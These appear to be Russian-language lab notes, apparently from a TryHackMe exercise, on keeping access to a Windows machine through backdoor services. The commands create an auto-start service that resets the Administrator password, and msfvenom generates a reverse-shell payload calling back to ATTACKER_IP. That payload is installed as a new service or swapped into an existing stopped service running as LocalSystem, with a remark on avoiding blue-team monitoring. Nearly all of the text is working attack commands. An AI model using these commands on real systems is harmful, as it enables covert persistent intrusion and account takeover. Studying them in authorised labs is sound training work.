# Можно воспользоваться службой которая работает в фоновом режиме и запускается при старте системы, чтобы внедрить код для повторного получения shell.

#### Creating backdoor services ####
## 1. Создаем и запускаем службу(после каждого равенства - пробел). Запускается при старте системы и меняет пароль администратора.
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
## 2. Т.к для выполнения слубды необходимо реализовать определеннный протокол, можно сгенерировать payload для reverse shell.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
## 3. Копируем payload(Исполняемый файл) на целевую машину и создаем новый сервис c запущенным слушателем на атакующей машине и получаем revshell
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2


#### Modifying existing services ####
# Обычно члены синий команды могут мониторить службы и вместо того, чтобы создавать свою службу можно использовать существующую отключенную.

## 1. Получить список служб
sc.exe query state=all
## 2. Находим стопнутый сервер и смотрим его конфигурацию
sc.exe qc THMService3
## 3. Важные вещи:
* BINARY_PATH_NAME - здесь должен быть наш payload
* START_TYPE - должен быть AUTO_START
* SERVICE_START_NAME - под чьим аккаунтом запущена служба, желательно LocalSystem
## 4. Генерируем Payload на атакующей машине и передаем на целевую
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
## 5. Реконфигурируем нужный сервис 
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
## 6. Запускаем листенер на атакующей машине и запускаем сервер на целевой машине и получем shell
sc.exe start THMService3
